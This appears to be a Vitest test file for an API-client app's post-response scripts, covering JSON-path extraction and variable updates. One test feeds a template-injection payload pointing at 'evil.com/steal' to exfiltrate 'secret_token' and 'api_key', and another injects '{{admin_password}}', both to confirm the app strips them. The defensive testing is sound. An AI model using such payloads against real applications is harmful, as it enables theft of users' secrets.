import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'

// Mock electron before importing modules that depend on session-log → BrowserWindow
vi.mock('electron', () => ({
  BrowserWindow: { getAllWindows: () => [] },
}))

import { openTestDatabase, closeDatabase } from '../../src/main/database/connection'
import { initEncryptionForTesting } from '../../src/main/services/encryption'
import { extractValue, extractJsonPath, executePostResponseScripts } from '../../src/main/services/script-execution'
import * as collectionsRepo from '../../src/main/database/repositories/collections'
import * as requestsRepo from '../../src/main/database/repositories/requests'
import * as environmentsRepo from '../../src/main/database/repositories/environments'
import type { ResponseData } from '../../src/shared/types/http'

beforeEach(() => {
  openTestDatabase()
  initEncryptionForTesting()
})
afterEach(() => closeDatabase())

// extractValue and extractJsonPath are pure functions that can be tested without DB

describe('extractValue', () => {
  it('extracts status code', () => {
    expect(extractValue('status', 200, null, {})).toBe('200')
    expect(extractValue('status', 404, null, {})).toBe('404')
  })

  it('extracts header value (case-insensitive)', () => {
    const headers = { 'Content-Type': 'application/json', 'X-Request-Id': 'abc123' }
    expect(extractValue('header.Content-Type', 200, null, headers)).toBe('application/json')
    expect(extractValue('header.content-type', 200, null, headers)).toBe('application/json')
    expect(extractValue('header.X-Request-Id', 200, null, headers)).toBe('abc123')
  })

  it('returns null for missing header', () => {
    expect(extractValue('header.X-Missing', 200, null, {})).toBeNull()
  })

  it('extracts body value via JSON path', () => {
    const body = JSON.stringify({ data: { token: 'secret123', count: 42 } })
    expect(extractValue('body.data.token', 200, body, {})).toBe('secret123')
    expect(extractValue('body.data.count', 200, body, {})).toBe('42')
  })

  it('extracts nested array element from body', () => {
    const body = JSON.stringify({ items: [{ id: 10 }, { id: 20 }] })
    expect(extractValue('body.items[0].id', 200, body, {})).toBe('10')
    expect(extractValue('body.items[1].id', 200, body, {})).toBe('20')
  })

  it('returns null for invalid body JSON', () => {
    expect(extractValue('body.data', 200, 'not json', {})).toBeNull()
  })

  it('returns null for null body', () => {
    expect(extractValue('body.data', 200, null, {})).toBeNull()
  })

  it('returns null for unknown source prefix', () => {
    expect(extractValue('cookie.session', 200, null, {})).toBeNull()
  })

  it('returns JSON string for object values', () => {
    const body = JSON.stringify({ data: { nested: { a: 1, b: 2 } } })
    expect(extractValue('body.data.nested', 200, body, {})).toBe('{"a":1,"b":2}')
  })
})

describe('extractJsonPath', () => {
  it('handles simple dot path', () => {
    expect(extractJsonPath({ a: { b: 'hello' } }, 'a.b')).toBe('hello')
  })

  it('handles array index', () => {
    expect(extractJsonPath({ items: ['x', 'y', 'z'] }, 'items[1]')).toBe('y')
  })

  it('handles mixed path with array and nested', () => {
    const data = { users: [{ name: 'Alice' }, { name: 'Bob' }] }
    expect(extractJsonPath(data, 'users[0].name')).toBe('Alice')
    expect(extractJsonPath(data, 'users[1].name')).toBe('Bob')
  })

  it('returns null for missing path', () => {
    expect(extractJsonPath({ a: 1 }, 'b')).toBeNull()
    expect(extractJsonPath({ a: { b: 1 } }, 'a.c')).toBeNull()
  })

  it('returns null for out-of-bounds array index', () => {
    expect(extractJsonPath({ items: [1] }, 'items[5]')).toBeNull()
  })

  it('handles number values', () => {
    expect(extractJsonPath({ count: 42 }, 'count')).toBe('42')
  })

  it('handles boolean values', () => {
    expect(extractJsonPath({ active: true }, 'active')).toBe('true')
  })

  it('returns null for null/undefined in path', () => {
    expect(extractJsonPath({ a: null }, 'a.b')).toBeNull()
  })
})

function makeResponse(overrides: Partial<ResponseData> = {}): ResponseData {
  return {
    status: 200,
    statusText: 'OK',
    headers: {},
    body: '{}',
    size: 0,
    timing: { start: 0, ttfb: 0, total: 0 },
    cookies: [],
    ...overrides,
  }
}

describe('executePostResponseScripts', () => {
  it('sets collection variable from response body', () => {
    const col = collectionsRepo.create({ name: 'Test' })
    const req = requestsRepo.create({ collection_id: col.id, name: 'Auth' })
    requestsRepo.update(req.id, {
      scripts: JSON.stringify({
        post_response: [{ action: 'set_variable', source: 'body.data.token', target: 'auth_token' }],
      }),
    })

    executePostResponseScripts(req.id, col.id, makeResponse({
      body: JSON.stringify({ data: { token: 'jwt-abc-123' } }),
    }))

    const updated = collectionsRepo.findById(col.id)!
    const vars = JSON.parse(updated.variables!)
    expect(vars.auth_token).toBe('jwt-abc-123')
  })

  it('handles missing source path gracefully', () => {
    const col = collectionsRepo.create({ name: 'Test' })
    const req = requestsRepo.create({ collection_id: col.id, name: 'R' })
    requestsRepo.update(req.id, {
      scripts: JSON.stringify({
        post_response: [{ action: 'set_variable', source: 'body.nonexistent.path', target: 'val' }],
      }),
    })

    // Should not throw
    executePostResponseScripts(req.id, col.id, makeResponse({ body: '{"other": true}' }))

    const updated = collectionsRepo.findById(col.id)!
    expect(updated.variables).toBeNull()
  })

  it('creates new variable on collection', () => {
    const col = collectionsRepo.create({ name: 'Test' })
    const req = requestsRepo.create({ collection_id: col.id, name: 'R' })
    requestsRepo.update(req.id, {
      scripts: JSON.stringify({
        post_response: [{ action: 'set_variable', source: 'status', target: 'last_status' }],
      }),
    })

    executePostResponseScripts(req.id, col.id, makeResponse({ status: 201 }))

    const vars = JSON.parse(collectionsRepo.findById(col.id)!.variables!)
    expect(vars.last_status).toBe('201')
  })

  it('updates existing variable on collection', () => {
    const col = collectionsRepo.create({ name: 'Test' })
    collectionsRepo.update(col.id, { variables: JSON.stringify({ token: 'old-value' }) })

    const req = requestsRepo.create({ collection_id: col.id, name: 'R' })
    requestsRepo.update(req.id, {
      scripts: JSON.stringify({
        post_response: [{ action: 'set_variable', source: 'body.token', target: 'token' }],
      }),
    })

    executePostResponseScripts(req.id, col.id, makeResponse({
      body: JSON.stringify({ token: 'new-value' }),
    }))

    const vars = JSON.parse(collectionsRepo.findById(col.id)!.variables!)
    expect(vars.token).toBe('new-value')
  })

  it('mirrorToActiveEnvironment updates matching env variable', () => {
    const col = collectionsRepo.create({ name: 'Test' })
    const env = environmentsRepo.create({
      name: 'Dev',
      variables: JSON.stringify([{ key: 'token', value: 'old', enabled: true }]),
    })
    environmentsRepo.activate(env.id)

    const req = requestsRepo.create({ collection_id: col.id, name: 'R' })
    requestsRepo.update(req.id, {
      scripts: JSON.stringify({
        post_response: [{ action: 'set_variable', source: 'body.token', target: 'token' }],
      }),
    })

    executePostResponseScripts(req.id, col.id, makeResponse({
      body: JSON.stringify({ token: 'refreshed' }),
    }))

    const updated = environmentsRepo.findById(env.id)!
    const vars = JSON.parse(updated.variables)
    expect(vars[0].value).toBe('refreshed')
  })

  it('strips {{...}} template patterns from extracted values to prevent injection', () => {
    const col = collectionsRepo.create({ name: 'Test' })
    const req = requestsRepo.create({ collection_id: col.id, name: 'R' })
    requestsRepo.update(req.id, {
      scripts: JSON.stringify({
        post_response: [{ action: 'set_variable', source: 'body.url', target: 'next_url' }],
      }),
    })

    // Malicious server returns a value containing {{secret}} template injection
    executePostResponseScripts(req.id, col.id, makeResponse({
      body: JSON.stringify({ url: 'https://evil.com/steal?data={{secret_token}}&more={{api_key}}' }),
    }))

    const vars = JSON.parse(collectionsRepo.findById(col.id)!.variables!)
    // Template patterns must be stripped — only the literal parts remain
    expect(vars.next_url).toBe('https://evil.com/steal?data=&more=')
    expect(vars.next_url).not.toContain('{{')
  })

  it('mirrorToActiveEnvironment also receives sanitized values', () => {
    const col = collectionsRepo.create({ name: 'Test' })
    const env = environmentsRepo.create({
      name: 'Dev',
      variables: JSON.stringify([{ key: 'token', value: 'real-secret', enabled: true }]),
    })
    environmentsRepo.activate(env.id)

    const req = requestsRepo.create({ collection_id: col.id, name: 'R' })
    requestsRepo.update(req.id, {
      scripts: JSON.stringify({
        post_response: [{ action: 'set_variable', source: 'body.token', target: 'token' }],
      }),
    })

    // Attacker tries to inject nested reference
    executePostResponseScripts(req.id, col.id, makeResponse({
      body: JSON.stringify({ token: '{{admin_password}}' }),
    }))

    const updated = environmentsRepo.findById(env.id)!
    const vars = JSON.parse(updated.variables)
    expect(vars[0].value).toBe('')
    expect(vars[0].value).not.toContain('{{')
  })

  it('mirrorToActiveEnvironment does NOT create new env variable', () => {
    const col = collectionsRepo.create({ name: 'Test' })
    const env = environmentsRepo.create({
      name: 'Dev',
      variables: JSON.stringify([{ key: 'base_url', value: 'https://api.com', enabled: true }]),
    })
    environmentsRepo.activate(env.id)

    const req = requestsRepo.create({ collection_id: col.id, name: 'R' })
    requestsRepo.update(req.id, {
      scripts: JSON.stringify({
        post_response: [{ action: 'set_variable', source: 'body.new_key', target: 'new_key' }],
      }),
    })

    executePostResponseScripts(req.id, col.id, makeResponse({
      body: JSON.stringify({ new_key: 'value' }),
    }))

    const updated = environmentsRepo.findById(env.id)!
    const vars = JSON.parse(updated.variables)
    // Should still only have the original variable
    expect(vars).toHaveLength(1)
    expect(vars[0].key).toBe('base_url')
  })
})
